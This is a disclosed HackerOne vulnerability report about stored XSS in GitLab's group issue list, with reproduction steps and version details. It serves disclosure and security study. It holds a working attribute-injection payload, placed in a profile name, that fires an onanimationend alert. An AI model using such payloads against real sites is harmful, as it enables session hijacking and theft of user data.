---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '859333'
original_report_id: '859333'
title: Stored XSS in group issue list
weakness: Cross-site Scripting (XSS) - Stored
team_handle: gitlab
created_at: '2020-04-25T18:32:50.706Z'
disclosed_at: '2020-11-21T18:19:32.202Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 27
asset_identifier: Your Own GitLab Instance
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Stored XSS in group issue list

## Metadata

- HackerOne Report ID: 859333
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: gitlab
- Disclosed At: 2020-11-21T18:19:32.202Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello Gitlab!

To reproduce the bug, we need to enable the "vue_issuables_list" feature in Gitlab. This feature is not enabled by default, but I think it would be better to fix this issue before this feature is permanently available.

#### Steps to reproduce:

1. Run Gitlab `docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest`
2. Enable the "vue_issuables_list" feature
	1. Connect to the GitLab container: `docker exec -it gitlab /bin/bash`
	2. Start a session on GitLab Rails console (in the container): `gitlab-rails console`
	3. Once the Rails console session has started, run: `Feature.enable(:vue_issuables_list)`
3. Go to the profile settings and set the full name: `foo style=animation-name:gl-spinner-rotate onanimationend=alert(1)`
{F803617}
4. Create a group and create a project in this group
5. Create an issue in the project
6. Go to the group issue list
{F803618}
{F803619}

#### My GitLab version

```
root@gitlab:/# gitlab-rake gitlab:env:info

System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.26.2
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.10.1
Revision:	e658772bd63
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	11.7
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	12.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

An attacker can:

1. Perform any action within the application that a user can perform
2. Steal sensitive user data
3. Steal user's credentials

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
